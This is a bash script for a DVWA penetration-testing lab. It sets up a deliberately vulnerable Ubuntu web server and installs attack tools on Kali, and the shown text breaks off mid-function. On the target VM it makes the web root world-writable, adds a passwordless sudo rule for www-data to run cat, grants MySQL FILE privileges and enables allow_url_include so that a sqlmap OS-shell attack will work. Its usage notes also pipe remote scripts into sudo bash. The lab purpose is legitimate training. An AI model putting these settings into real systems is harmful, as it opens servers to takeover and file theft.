#!/bin/bash
# =================================================
# Script Name: dvwa-pentest-lab.sh
# Author: Harsha GV
# Date: 2025-09-15
# Description: Automates DVWA setup on Ubuntu VM and attack tool setup/demonstration on Kali VM,
#              following a penetration testing tutorial.
# Version: 1.0
# =================================================
#
# === Usage Instructions ===
#
# Usage for Ubuntu DVWA VM:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s dvwa
#       - Installs SSH, DVWA with Apache2, and modern MySQL.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s mysql50
#       - Removes current DB server (MariaDB/MySQL) and installs MySQL 5.5 via Docker for DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s set_permissions_ubuntu
#       - Sets read/write permissions for DVWA directory (required for os-shell exploit).
#
# Usage for Kali VM (ensure DVWA Ubuntu VM is running and accessible):
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_prereqs
#       - Installs prerequisite attack tools on Kali.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_web_scan
#       - Runs dirb and gobuster web content scanners against DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_brute_force
#       - Provides instructions and sample commands for brute-force attacks (Burp Suite, Hydra).
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_chromium
#       - (After starting Burp manually) Launches Chromium with proxy and certificate configured.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_vuln_scan
#       - Provides guidance for OWASP ZAP or OpenVAS scanning.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_sqlmap_sqli
#       - Provides sample sqlmap commands for basic SQL injection.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_os_shell
#       - Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.

# Generate the script logs
LOGFILE="$(pwd)/dvwa-pentest-lab-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

# === ASCII Art Banner Start ===
echo ""
echo "##################################################################################"
echo "#   _______  ____    ____ ____    __    ____  ___                                #"
echo "#  |       \ \   \  /   / \   \  /  \  /   / /   \      DVWA PENTEST LAB         #"
echo "#  |  .--.  | \   \/   /   \   \/    \/   / /  ^  \     Setup Script             #"
echo "#  |  |  |  |  \      /     \            / /  /_\  \                             #"
echo "#  |  '--'  |   \    /       \    /\    / /  _____  \   Kali & Ubuntu Automation #"
echo "#  |_______/     \__/         \__/  \__/ /__/     \__\                           #"
echo "#                                                                                #"
echo "#                      Automating your vulnerable web app & attack tools!        #"
echo "##################################################################################"
echo ""
# === ASCII Art Banner End ===

# Stricter Error Handling
set -euo pipefail
IFS=$'\n\t'

### === COLOR CONSTANTS === ###
RESET="\033[0m"
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PINK="\033[1;35m"
CYAN="\033[1;36m"

### === PRINT FUNCTIONS === ###
print_info() { echo -e "${CYAN}[INFO]${RESET} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${RESET} $1"; }
print_warn() { echo -e "${YELLOW}[WARNING]${RESET} $1"; }
print_error() { echo -e "${RED}[ERROR]${RESET} $1 ❌"; }
print_title() { echo -e "\n${PINK}=== $1 ===${RESET}\n"; }

# Signal-safe Cleanup
cleanup() {
  local exit_code=$?
  if [ $exit_code -ne 0 ]; then
    print_error "Script exited with error code: $exit_code"
  fi
  print_info "Cleaning up before exit."
  # Add any specific cleanup logic here, e.g., remove temp files
}
handle_interrupt() {
  print_error "Script interrupted by user (SIGINT)" >&2
  exit 130
}
trap cleanup EXIT
trap handle_interrupt INT

# === GLOBAL CONFIGURATION (USER EDITS REQUIRED ON KALI VM) ===
# IMPORTANT: For Kali VM functions, set the IP of your DVWA Ubuntu VM here.
# This IP must be reachable from your Kali VM.
# Example: "http://192.168.1.100" or "http://dvwa.local"
# Default target URL
DEFAULT_DVWA_TARGET_URL="http://192.168.56.101"

# Check if DVWA_TARGET_URL is already set as an environment variable or fallback to default
: "${DVWA_TARGET_URL:=$DEFAULT_DVWA_TARGET_URL}"

print_info "Using DVWA_TARGET_URL: $DVWA_TARGET_URL"

# if [ -z "${DVWA_TARGET_URL:-}" ]; then
#     echo -ne "\e[96mEnter the DVWA Target URL (default: ${DEFAULT_DVWA_TARGET_URL}, 15s timeout):\e[0m "
#     USER_INPUT_TARGET_URL="" # Initialize as empty string
#     if read -t 15 USER_INPUT_TARGET_URL < /dev/tty; then
#         DVWA_TARGET_URL="${USER_INPUT_TARGET_URL}" # Use user input if provided, else default
#     else
#         DVWA_TARGET_URL="${DEFAULT_DVWA_TARGET_URL}" # Timed out, use default
#     fi
#     print_info "Using DVWA_TARGET_URL (from prompt): ${DVWA_TARGET_URL}"
# else
#     # DVWA_TARGET_URL was already set as an environment variable
#     print_info "Using DVWA_TARGET_URL (from environment variable): ${DVWA_TARGET_URL}"
# fi

# Final check to ensure it's not the placeholder and user is aware if it's the default
if [[ "$DVWA_TARGET_URL" == "$DEFAULT_DVWA_TARGET_URL" ]]; then
    print_warn "DVWA_TARGET_URL is set to the default: ${DVWA_TARGET_URL}. Ensure this is correct for your setup."
fi
# -------------------------------------------------------------

### === UBUNTU DVWA VM FUNCTIONS === ###

# Function: ubuntu_install_ssh
# Installs and configures OpenSSH server on Ubuntu.
ubuntu_install_ssh() {
    print_title "Installing and Configuring OpenSSH Server"

    print_info "Updating system.."
    apt update && apt upgrade -y

    print_info "Installing OpenSSH server.."
    apt install -y openssh-server net-tools curl

    print_info "Editing SSH configuration: /etc/ssh/sshd_config"
    local SSHD_CONFIG="/etc/ssh/sshd_config"
    sed -i 's/^#Port 22/Port 22/' "$SSHD_CONFIG" || print_warn "Port 22 already uncommented or missing."
    sed -i 's/^#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/' "$SSHD_CONFIG" || print_warn "ListenAddress 0.0.0.0 already uncommented or missing."
    sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' "$SSHD_CONFIG" || print_warn "PasswordAuthentication yes already uncommented or missing."
    # Optional: Enable root login, generally not recommended for security reasons
    # sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' "$SSSD_CONFIG" || true

    print_info "Configuring UFW firewall for SSH access.."
    ufw status || true
    ufw enable || print_warn "UFW already enabled."
    ufw allow 22 || print_warn "UFW rule for port 22 already exists."

    print_info "Restarting SSH service.."
    systemctl restart ssh

    print_success "OpenSSH server installed successfully!"
}

# Function: ubuntu_install_dvwa_apache_mysql
# Installs DVWA with Apache2, PHP, and Modern MySQL on Ubuntu.
ubuntu_install_dvwa_apache_mysql() {
    print_title "Installing DVWA with Apache2 and Modern MySQL"

    local DB_NAME="dvwa"
    local DB_USER="dvwa"
    local DB_HOST="localhost"
    local WEB_DIR="/var/www/html/dvwa"
    local SERVER_NAME="localhost" # Can be updated dynamically if needed.

    # --- Ask for SQL user password ---
    echo -e "\e[96mEnter SQL password for DVWA user (press Enter ↲ for default: pass):\e[0m"
    if ! read -t 15 DB_PASS < /dev/tty; then
        DB_PASS="pass"
    fi
    echo
    DB_PASS=${DB_PASS:-pass}

    print_info "Installing required packages for DVWA (Apache, PHP, MySQL).."
    apt update
    apt install -y apache2 mysql-server php php-mysqli php-gd php-zip php-json php-bcmath php-xml libapache2-mod-php git

    print_info "Enabling and starting Apache & MySQL.."
    systemctl enable apache2 --now
    systemctl enable mysql --now

    print_info "Cloning DVWA repository.."
    cd /var/www/html
    if [ -d "DVWA" ] || [ -d "dvwa" ]; then
        print_info "DVWA folder already exists, skipping clone.."
    else
        git clone https://github.com/digininja/DVWA.git
        mv DVWA dvwa
    fi

    print_info "Setting permissions.."
    sudo chown -R www-data:www-data /var/www/html/dvwa
    sudo chmod -R 755 /var/www/html/dvwa

    print_info "Configuring MySQL for DVWA.."
    # This assumes root can connect to MySQL initially without a password, or via auth_socket.
    print_info "Attempting to create DVWA database and user. You might be prompted for MySQL root password if set."
    # Using 'mysql -p' to ensure it prompts for password if root has one set.
    mysql -u root -p <<EOF
    CREATE DATABASE IF NOT EXISTS ${DB_NAME};
    CREATE USER IF NOT EXISTS '${DB_USER}'@'${DB_HOST}' IDENTIFIED BY '${DB_PASS}';
    GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'${DB_HOST}';
    FLUSH PRIVILEGES;
EOF

    print_info "Updating DVWA config file.."
    cd "$WEB_DIR/config" || { print_error "DVWA config directory not found."; exit 1; }
    cp -n config.inc.php.dist config.inc.php
    local CONFIG_FILE="/var/www/html/dvwa/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "Error: Configuration file not found at $CONFIG_FILE"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE"
    sed -i "/'db_server'/c\\
    \$_DVWA[ 'db_server' ] = '$DB_HOST';
    " "$CONFIG_FILE"
    sed -i "/'db_user'/c\\
    \$_DVWA[ 'db_user' ] = '$DB_USER';
    " "$CONFIG_FILE"
    sed -i "/'db_password'/c\\
    \$_DVWA[ 'db_password' ] = '$DB_PASS';
    " "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_server'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_server'] = '${DB_HOST}';|" "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_user'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_user'] = '${DVWA_DB_USER}';|" "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_password'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_password'] = '${DVWA_DB_PASS}';|" "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_database'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_database'] = '${DVWA_DB_NAME}';|" "$CONFIG_FILE"

	print_info "DVWA configuration file updated successfully."

    print_info "Configuring PHP settings for DVWA.."
    local PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3") # Fallback to 8.3
    local PHPINI="/etc/php/${PHP_VER}/apache2/php.ini"
    sed -i 's/^\s*allow_url_fopen\s*=.*/allow_url_fopen = On/' "$PHPINI" || true
    sed -i 's/^\s*allow_url_include\s*=.*/allow_url_include = On/' "$PHPINI" || true

    print_info "Restarting Apache.."
    systemctl restart apache2

    ### Apache Configuration for Localhost Only ###
    print_info "Setting Apache to localhost-only mode"
    # 1) Set GLOBAL ServerName in apache2.conf to prevent AH00558 warning
    if ! grep -q "ServerName" /etc/apache2/apache2.conf; then
        print_info "Adding global ServerName to apache2.conf"
        echo "ServerName ${SERVER_NAME}" | sudo tee -a /etc/apache2/apache2.conf > /dev/null
    else
        print_info "Updating existing global ServerName in apache2.conf"
        sudo sed -i "s/^ServerName.*/ServerName ${SERVER_NAME}/" /etc/apache2/apache2.conf
    fi
    # 2) Set Apache to listen only on 127.0.0.1:80
    sed -i 's/^Listen .*/Listen 80/' /etc/apache2/ports.conf
    # 3) Create DVWA VirtualHost config
    sudo tee /etc/apache2/sites-available/dvwa.conf > /dev/null <<EOF
    <VirtualHost *:80>
        ServerName ${SERVER_NAME}
        DocumentRoot /var/www/html

        <Directory /var/www/html/dvwa>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        ErrorLog \${APACHE_LOG_DIR}/dvwa_error.log
        CustomLog \${APACHE_LOG_DIR}/dvwa_access.log combined
    </VirtualHost>
EOF
    # 3 Enable site and modules
    sudo a2ensite dvwa.conf || print_warn "DVWA site already enabled."
    sudo a2enmod rewrite || print_warn "Rewrite module already enabled."
    sudo a2dissite 000-default.conf || print_warn "Default site already disabled."
    sudo apache2ctl configtest
    sudo apache2ctl -S

    print_info "Configuring UFW firewall for HTTP access.."
    ufw allow 80 || print_warn "UFW rule for port 80 already exists."

    # 4 Restart Apache
    sudo systemctl restart apache2

    echo "======================================="
    print_success "[✔] DVWA configured successfully (Modern MySQL)!"
    print_title "Global ServerName set to ${SERVER_NAME}"
    curl -I http://localhost/dvwa/setup.php || print_warn "Curl to setup.php failed, verify Apache is running."
    print_title "  → Accessible at: http://${SERVER_NAME}/dvwa/setup.php"
    print_title "Default DB User: ${DB_USER}, Password: ${DB_PASS}"
    print_title " Username : admin"
    print_title " Password : password (DVWA default)"
    echo "======================================="
}

# Function: ubuntu_install_mysql_docker_vulnerable
# Removes current database and installs MySQL 5.5 in Docker for DVWA on Ubuntu.
ubuntu_install_mysql_docker_vulnerable() {
    print_title "Installing Vulnerable MySQL (Dockerized) for DVWA"
    print_warn "Note: MySQL 5.0.15 is not readily available as a pre-built Docker image."
    # MySQL 5.5: https://hub.docker.com/layers/library/mysql/5.5/images/sha256-d404d78aa797c87c255e5ae2beb5d8d0e4d095f930b1f20dc208eaa957477b74
    print_warn "This script will install MySQL 5.5 in a Docker container as an older, vulnerable alternative."
    print_warn "If you specifically need 5.0.15, you would need to build a custom Docker image from source."

    local VULN_MYSQL_VERSION="5.5" # Using 5.5 as a readily available vulnerable version via Docker Hub
    local MYSQL_IMAGE="mysql"
    local CONTAINER_NAME="dvwa-vulnerable-mysql"
    local MYSQL_ROOT_PASSWORD="password" # Consistent with other parts of the script
	local HTML_ROOT_PATH="/var/www/html"
    local DVWA_DB_NAME="dvwa"
    local DVWA_DB_USER="dvwa"
    local DVWA_DB_PASS="pass"
    local DB_HOST="127.0.0.1" # DVWA will connect to localhost, which is mapped to the container

    print_warn "This will stop and remove existing MySQL/MariaDB packages and data, and then install Docker."
    print_warn "It will then deploy a MySQL ${VULN_MYSQL_VERSION} Docker container."
    echo -ne "Are you sure you want to continue? (y/N) "
    if ! read -t 15 -n 1 -r REPLY < /dev/tty; then
        REPLY="N"
    fi
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting vulnerable MySQL Docker installation."
        exit 1
    fi

    # 1. Stop and purge existing database servers
    print_info "Stopping and purging existing database servers (MySQL/MariaDB) to avoid port conflicts.."
    systemctl stop mysql || true
    systemctl stop mariadb || true
    apt-get purge -y mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-* mariadb-server mariadb-client mariadb-common || true
    apt-get autoremove -y
    apt-get clean
    rm -rf /etc/mysql /var/lib/mysql /var/lib/mysql/mysql # Clean up old data directories
    print_success "Existing database services purged."

    # 2. Install Docker
    print_info "Installing Docker.."
    apt-get update
    # Install Docker's required packages
    apt-get install -y ca-certificates curl gnupg lsb-release
    # Add Docker's GPG key
    mkdir -m 0755 -p /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor | sudo tee /etc/apt/keyrings/docker.gpg > /dev/null
    # Add Docker repository
	echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
      $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    apt-get update
    # Install Docker components
    apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    systemctl enable docker --now
    print_success "Docker installed and started."
    TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    if [ -z "$TARGET_USER" ]; then
        print_error "Could not determine target user. Exiting."
        exit 1
    fi
    USER_HOME=$(eval echo "~${TARGET_USER}")
    sudo usermod -aG docker "$TARGET_USER"
    print_warn "User '$TARGET_USER' added to 'docker' group. Please LOG OUT and LOG BACK IN (or reboot) for this change to take full effect."

    # 3. Pull and Run MySQL Docker Container
    # Detect system architecture
    ARCH=$(uname -m)
	if [[ "$ARCH" == "x86_64" || "$ARCH" == "amd64" ]]; then
	    MYSQL_IMAGE="mysql"
	    print_info "Detected AMD64 architecture. Pulling standard MySQL image."
    elif [[ "$ARCH" == "arm64" || "$ARCH" == "aarch64" ]]; then
        print_info "Detected ARM64 architecture. Pulling ARM compatible MySQL image."
	    MYSQL_IMAGE="biarms/mysql"
	fi

    docker pull "${MYSQL_IMAGE}:${VULN_MYSQL_VERSION}" || { print_error "Failed to pull MySQL Docker image."; exit 1; }

    print_info "Stopping and removing any old '${CONTAINER_NAME}' container if it exists.."
    docker stop "${CONTAINER_NAME}" &>/dev/null || true
    docker rm "${CONTAINER_NAME}" &>/dev/null || true

    print_info "Starting MySQL ${VULN_MYSQL_VERSION} Docker container '${CONTAINER_NAME}'.."
    # Map container port 3306 to host port 3306, relying on native DB being purged.
    # Environment variables handle initial root password, DVWA database, and DVWA user creation.
	docker run --name "${CONTAINER_NAME}" \
	    --network host \
        --restart unless-stopped \
	    -v "${HTML_ROOT_PATH}:${HTML_ROOT_PATH}" \
	    -e MYSQL_ROOT_PASSWORD="${MYSQL_ROOT_PASSWORD}" \
	    -e MYSQL_DATABASE="${DVWA_DB_NAME}" \
	    -e MYSQL_USER="${DVWA_DB_USER}" \
	    -e MYSQL_PASSWORD="${DVWA_DB_PASS}" \
	    -d "${MYSQL_IMAGE}:${VULN_MYSQL_VERSION}" \
	    --secure-file-priv="" || { print_error "Failed to start MySQL Docker container. Check 'docker logs ${CONTAINER_NAME}' for details."; exit 1; }

    print_info "Waiting for MySQL container to become healthy (up to 90 seconds).."
    local RETRIES=18 # 18 * 5 seconds = 90 seconds
    local COUNT=0
    while ! docker exec "${CONTAINER_NAME}" mysqladmin ping -h localhost --silent; do
        sleep 5
        COUNT=$((COUNT+1))
        if [ "$COUNT" -ge "$RETRIES" ]; then
            print_error "${MYSQL_IMAGE} Docker container did not start in time. Check 'docker logs ${CONTAINER_NAME}' and 'docker ps'."
            exit 1
        fi
        print_info "Still waiting for MySQL container ($COUNT/$RETRIES).."
    done
    print_success "${MYSQL_IMAGE} ${VULN_MYSQL_VERSION} Docker container started and is responsive."

	# Ensure dvwa user exists before granting FILE privilege
	print_info "Waiting for dvwa user to be created.."
	MAX_WAIT=12
	for ((i=1; i<=MAX_WAIT; i++)); do
	  if docker exec "${CONTAINER_NAME}" \
	    mysql -u root -p"${MYSQL_ROOT_PASSWORD}" \
	    -e "SELECT User FROM mysql.user WHERE User = '${DVWA_DB_USER}'\G" | grep -q "${DVWA_DB_USER}"; then
	    print_success "User '${DVWA_DB_USER}' exists in MySQL."
	    break
	  fi
	  print_info "dvwa user not found yet... retrying ($i/$MAX_WAIT)"
	  sleep 2
	done
 
	print_info "Granting ALL and FILE privileges to '${DVWA_DB_USER}'.."
	docker exec "${CONTAINER_NAME}" \
	  mysql -u root -p"${MYSQL_ROOT_PASSWORD}" \
	  -e "GRANT ALL PRIVILEGES ON ${DVWA_DB_NAME}.* TO '${DVWA_DB_USER}'@'%';
	      GRANT FILE ON *.* TO '${DVWA_DB_USER}'@'%';
	      FLUSH PRIVILEGES;" || {
	    print_error "Failed to grant ALL and FILE privileges to '${DVWA_DB_USER}'"
	    exit 1
	}
	print_success "ALL and FILE privileges granted to '${DVWA_DB_USER}'@'%'"
	
    # 4. Update DVWA Config
    print_info "Updating DVWA config file for Dockerized MySQL.."
    local WEB_DIR_DVWA="/var/www/html/dvwa"
    local CONFIG_FILE="$WEB_DIR_DVWA/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "DVWA configuration file not found at $CONFIG_FILE. Did DVWA get installed first?"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE" # Remove Windows-style carriage returns

	# Update db_server to $DB_HOST - e.g. '127.0.0.1' to force TCP connection
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_server'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_server'] = '${DB_HOST}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_user'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_user'] = '${DVWA_DB_USER}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_password'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_password'] = '${DVWA_DB_PASS}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_database'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_database'] = '${DVWA_DB_NAME}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_port'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_port'] = '${DB_PORT:-3306}';|" "$CONFIG_FILE"
    print_info "DVWA configuration file updated for Dockerized MySQL."

    print_info "Restart apache2 service.."
 	sudo systemctl restart apache2

    print_success "Vulnerable MySQL (${VULN_MYSQL_VERSION}) Docker container is running and DVWA is configured to use it!"
    print_info "Remember to ensure your DVWA web server (Apache2) is running on the Ubuntu VM."
    print_info "Go to DVWA's /setup.php page in your browser (http://localhost/dvwa/setup.php) to configure and create the database tables."
    print_info "MySQL Docker container '${CONTAINER_NAME}' is configured to start automatically with Docker."

 	print_info "Verifying DVWA login page is accessible.."
	
	# Give the web server a few seconds to start fully
	sleep 5
	
	if curl -s -o /dev/null -w "%{http_code}" http://localhost/dvwa/login.php | grep -q "200"; then
	    print_success "DVWA login page is accessible at http://localhost/dvwa/login.php"
	else
	    print_error "DVWA login page is NOT accessible. Check Apache2 and Docker MySQL container."
	    print_info "Try checking Apache logs: journalctl -u apache2 or /var/log/apache2/error.log"
	    print_info "Also check Docker MySQL logs: docker logs ${CONTAINER_NAME}"
	fi
}

# Function: ubuntu_set_dvwa_permissions
# Sets read/write permissions for the DVWA directory on Ubuntu (for OS shell exploit).
ubuntu_set_dvwa_permissions() {
    print_title "Setting DVWA Directory Permissions for OS Shell Exploitation"
    local DVWA_PATH="/var/www/html/dvwa"
    if [ ! -d "$DVWA_PATH" ]; then
        print_error "DVWA directory '$DVWA_PATH' not found. Please ensure DVWA is installed first."
        exit 1
    fi
    print_warn "WARNING: This command makes the DVWA directory and its contents world-writable (ugo+rw), which is a significant security risk for any production environment!"
    echo -ne "Are you absolutely sure you want to run 'chmod -R ugo+rw ${DVWA_PATH}'? (y/N) "
    if ! read -t 15 -n 1 -r REPLY < /dev/tty; then
        REPLY="N"
    fi
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting permission change. OS shell exploitation might fail without this."
        exit 1
    fi
    sudo chmod -R ugo+rw "$DVWA_PATH"
    sudo ls -la "$DVWA_PATH"
    print_success "Permissions set for $DVWA_PATH to be world-writable (ugo+rw)."
    print_info "This is specifically for enabling sqlmap's --os-shell upload capabilities to write files to the web root."

    # Add sudoers permission to allow www-data to run /bin/cat without password
    echo "www-data ALL=(ALL) NOPASSWD: /bin/cat" | sudo tee /etc/sudoers.d/www-data-cat
    sudo chmod 440 /etc/sudoers.d/www-data-cat
    print_success "Sudoers rule added to allow www-data user to run /bin/cat without password."
}

### === KALI VM FUNCTIONS === ###
# https://veildefenders.com/kali-linux-burp-suite-configuration/

# Function: stop_if_running
# Safely stops processes matching a pattern, avoiding self-termination.
stop_if_running() {
    local pattern="$1"
    # Use -x to match the exact process name. This is much safer than -f.
    if pgrep -x "$pattern" >/dev/null; then
        print_info "Found running '$pattern' process(es). Attempting graceful shutdown..."
        pkill -x "$pattern"
        sleep 2
        if pgrep -x "$pattern" >/dev/null; then
            print_warn "'$pattern' still running, sending SIGKILL."
            pkill -9 -x "$pattern"
        fi
        print_success "Stopped '$pattern' process(es)."
    else
        print_info "No '$pattern' process found running."
    fi
}

# Function: kali_install_tools_prerequisites
# Installs common penetration testing tools on Kali Linux, including Docker for ZAP.
kali_install_tools_prerequisites() {
    print_title "Installing Kali Attack Tools Prerequisites"
    print_info "Updating system and installing required attack tools.."
    sudo apt update
    sudo apt install -y \
      dirb gobuster seclists \
      hydra sqlmap nikto burpsuite zaproxy \
      python3-pip \
      pipx \
      net-tools curl git libnss3-tools chromium

    TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    if [ -z "$TARGET_USER" ]; then
        print_error "Could not determine target user. Exiting."
        exit 1
    fi
    USER_HOME=$(eval echo "~${TARGET_USER}")

    # === Centralized Output Directory Setup for Target User ===
    local BASE_SCANS_DIR="${USER_HOME}/scans/dvwa"
    print_info "Ensuring base scans directory exists and is owned by '$TARGET_USER': ${BASE_SCANS_DIR}"
    sudo mkdir -p "${BASE_SCANS_DIR}"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "${BASE_SCANS_DIR}"
    print_success "Base scans directory prepared."
    # ==========================================================

    # Ensure pipx environment directories exist and have correct permissions
    print_info "Ensuring correct permissions for pipx directories for user '$TARGET_USER'.."
    sudo -u "$TARGET_USER" mkdir -p "${USER_HOME}/.local/state/pipx"
    sudo -u "$TARGET_USER" mkdir -p "${USER_HOME}/.local/share/pipx"

    # Add pipx executables to PATH for the current script's execution context
    local PIPX_BIN_DIR="${USER_HOME}/.local/bin"
    if [[ ":$PATH:" != *":${PIPX_BIN_DIR}:"* ]]; then
        print_info "Adding ${PIPX_BIN_DIR} to PATH for current script execution."
        export PATH="$PATH:${PIPX_BIN_DIR}"
    fi

    # Ensure pipx's environment is correctly set up for the target user's shell configuration
    print_info "Ensuring pipx path is correctly set up in shell config for user '$TARGET_USER'.."
    sudo -u "$TARGET_USER" pipx ensurepath --force > /dev/null 2>&1 || print_warn "pipx ensurepath failed for user '$TARGET_USER'."

    # Installing/Upgrading zap-cli-v2
    print_info "Installing/Upgrading zap-cli-v2 (Modern Python wrapper for OWASP ZAP API).."
    if sudo -u "$TARGET_USER" pipx install zap-cli-v2 --force >/dev/null 2>&1; then
        print_success "zap-cli-v2 installed/upgraded successfully for user '$TARGET_USER'."
    else
        print_error "Failed to install/upgrade zap-cli-v2 for user '$TARGET_USER'."
    fi
    
    # Verify zap-cli-v2 is executable *within the current script's PATH*
    if command -v zap-cli-v2 &> /dev/null; then
        print_success "zap-cli-v2 executable found in current PATH."
    else
        print_error "zap-cli-v2 executable NOT found in current PATH even after installation attempt."
    fi

    # Install JDK for ZAP if not installed
    print_info "Installing JDK for ZAP.."
    sudo apt-get install -y openjdk-21-jdk || sudo apt-get install -y default-jdk || print_warn "Failed to install recommended JDK for ZAP."

    # Handle the case where this script is run multiple times by ensuring no old
    # mitmproxy instance is still running and occupying the port.
    print_info "Checking for and stopping any existing mitmproxy processes..."
    # For mitmproxy, using -f is safe because 'mitmdump' is not a script argument.
    if pgrep -f "mitmdump -p 8080" >/dev/null; then
        pkill -f "mitmdump -p 8080"
        sleep 2
        print_success "Stopped existing mitmproxy instances."
    else
        print_info "No pre-existing mitmproxy process found."
    fi

    print_info "Checking for and stopping any existing Chromium processes..."
    # For chromium, we use -x to match the EXACT process name, which is safe.
    if pgrep -x "chromium" >/dev/null; then
        pkill -x "chromium"
        sleep 2
        print_success "Stopped existing Chromium instances."
    else
        print_info "No pre-existing Chromium process found."
    fi

    print_info "Starting mitmproxy's mitmdump in the background on port 8080.."
    # Ensure mitmproxy directory exists for the cert generation
    sudo -u "$TARGET_USER" mkdir -p "${USER_HOME}/.mitmproxy"
    
    # Run mitmdump. It will auto-generate its CA cert on the first run.
    sudo -u "$TARGET_USER" nohup mitmdump -p 8080 --set block_global=false > /dev/null 2>&1 &
    MITM_PID=$!
    
    # Clean up the proxy when the script exits
    #trap 'print_info "Stopping mitmproxy.."; kill $MITM_PID' EXIT

    print_info "Waiting for mitmproxy listener on 127.0.0.1:8080.."
    for i in {1..15}; do
      if nc -z 127.0.0.1 8080; then
        print_success "mitmproxy listener is ready."
        break
      fi
      sleep 1
    done
    if ! nc -z 127.0.0.1 8080; then
        print_error "mitmproxy failed to start on port 8080. Aborting."
        return 1
    fi

    # ---------- CERTIFICATE: AUTO-COPY AND INSTALL ----------
    local MITM_CERT_PEM_PATH="${USER_HOME}/.mitmproxy/mitmproxy-ca-cert.pem"
    
    print_info "Waiting for mitmproxy CA certificate to be generated.."
    for i in {1..10}; do
        if sudo -u "$TARGET_USER" [ -f "$MITM_CERT_PEM_PATH" ]; then
            break
        fi
        sleep 1
    done

    if ! sudo -u "$TARGET_USER" [ -f "$MITM_CERT_PEM_PATH" ]; then
        print_error "mitmproxy CA certificate not found at ${MITM_CERT_PEM_PATH}."
        return 1
    fi
    print_success "Found mitmproxy CA certificate."

    # System-wide trust store install
    print_info "Installing mitmproxy cert into system trust store.."
    sudo cp "${MITM_CERT_PEM_PATH}" /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
    sudo update-ca-certificates
    print_success "mitmproxy certificate installed into system trust store."

    local CERT_NAME="mitmproxy"
    local USER_NSS_DB="${USER_HOME}/.pki/nssdb"

